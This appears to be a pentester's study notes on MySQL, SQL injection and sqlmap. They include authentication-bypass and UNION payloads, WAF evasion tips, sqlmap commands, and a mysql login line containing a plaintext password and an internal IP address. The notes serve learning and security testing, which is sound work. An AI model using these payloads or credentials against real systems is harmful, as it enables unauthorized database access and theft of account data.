# MySQL

[https://www.w3schools.com/sql/default.asp](https://www.w3schools.com/sql/default.asp)

connect to mysql database: `mysql -u awdmgmt -pUChxKQk96dVtM07 -h 10.104.11.198`

`-u` = username

`-p` = password

`-h` = hostadress

> **; at the end of each line**

`show databases;` for a listing of all the databses on the target

`use awdmgmt_accounts;`for selecting the database to use

`show tables;` a listing of all tables in the selected database

`select * from accounts;`

#### SQL statement

**SELECT** &lt;column\_name&gt; **FROM** &lt;table\_name&gt; **WHERE** &lt;condition&gt;; = **SELECT** name, desciption **FROM** products **WHERE** id=9;

SELECT \* FROM Accounts where username = 'zaid' and password = '$PASSWORD'; The system itself puts the ' ' around the variables.

> Remember the **;** at the end of the line

**Comments** `#` this is a comment or `--` this is a comment

#### Example PHP code fragment

1. make a connection: $connection = mysqli\_connect\($dbhostname, $dbuser, $dbpassword, $dbname\);
2. define query: $query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";
3. Get results from database: $results = mysqli\_query\($connection, $query\);
4. Display results: display\_results\($results\);

## SQL Injection

Most webapplications use some kind of backend database to store or retrieve the date they process. To interact with the database SQL language is used. SQL Injection attacks allow an unauthorized user to take control over SQL statements used by a web application. **Getting control over a backend database** has a huge impact.

[https://www.youtube.com/watch?v=WFFQw01EYHM](https://www.youtube.com/watch?v=WFFQw01EYHM)

#### Testing - Finding SQL Injections

Check every user input like GET, POST, HEADER, User-Agent, Cookie, Accept and try to inject:

1. String terminators: ' and "
2. Reserved characters like  . / or  
3. SQL commands: SELECT, UNION, ORDER BY and others
4. SQL comment: \# or --

SELECT user\(\) for the name of the user currently using the database \(process runs as\)

[https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

[http://www.unixwiz.net/techtips/sql-injection.html](http://www.unixwiz.net/techtips/sql-injection.html)

`'--` or `'#`

`' OR 1=1 -- 1`

`admin' OR '1'='1`

`admin' OR '1'='1'-- admin' OR '1'='1' #`

`admin' -- -` `admin' OR 1=1 # admin' OR '1'='1' #`

You can end the insertion without an `;` like above or an`;` like below

`admin'; -- -` `admin' OR 1=1; -- -` `admin' OR '1'='1'; -- -`

`' or 1=1; -- -`

`' or 1=1;#`

the part at the end `; --`is for telling the webapp to ignore anything thereafter or to not append anything after the string. **You can also use the other SQL comment \#**

> Please also note a littletrick we used in the payload: the comment is not just two dashes and a space `( -- - )`, it also contains a third dash. This because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment.

`' OR '1'='1 Note: There is a space on the end of this expression`

`http://example.com/app/accountView?id=' or '1'='1`

The query then becomes: SELECT Name, Description FROM Products WHERE ID=' ' **OR '1'='1' . This tells the database to select the items by checking two conditions:**

1. The id must be empty \(id=' '\)
2. **OR** an always true condition \('1'='1'\)

This tells the database to select all the items in the Products table!

I can't express enough how easy it is to bypass some WAFs. If you're getting blocked using the traditional 1'or'1'='1 payload, try simply doing: 92'or'88'='88 Apparently using a number other than 1 confuses the hell out of them.

It Bypasses almost any filters\(no space needed\)works like charm User:’\|\|1\# If user isn’t vulnerable try password filled but with a valid username.. User:admin Pass:’\|\|1\# Note:-can try double quotes

' or 'a'='a'--

### URL encode

%20 = space

%23 = \#

### Union

**UNION** combine output of SELECT statements. UNION SELECT Username, Paswword FROM Accounts WHERE 'a'='a

Thus changing the original query to SELECT Name, Description FROM Products WHERE IS=' ' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';

SELECT Description FROM Items WHERE Id=**' ' UNION SELECT user\(\); -- - ';**

![](../../.gitbook/assets/screen-shot-2018-06-26-at-20.32.27.png)

## SQLMAP

_**/usr/share/sqlmap/docs/readme.pdf**_

Sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

`sqlmap -h or --help` for help

`-u` for url and the parameter with the value e.g. sqlmap -u "www.target.com/vuln.php?id=1" with **GET**

`-p`for the parameter to test, when only one you can leave this out in the example above it is `-p id`

`--data='user=a&pass=a' -p user` Data string to be sent through **POST** like with forms etc and test user parameter

`--wizard` for beginner wizard

`--technique=U` technique used for investigating; Union

`--users` for users

`sqlmap -u "`[`http://altoromutual.com/bank/login.aspx`](http://altoromutual.com/bank/login.aspx)`" --data="uid=admin&passw=admin&btnSubmit=Login" -p uid`

`sqlmap -u "sqli.site/view.php?id=1"`

**One huge time-saver** when learning SQLMap is to use the -r switch. You can catch the vulnerable request using a proxy like Burp, save it to a text file, and then use SQLMap to scan it just by running:

```text
sqlmap -r file.reg -p user
```

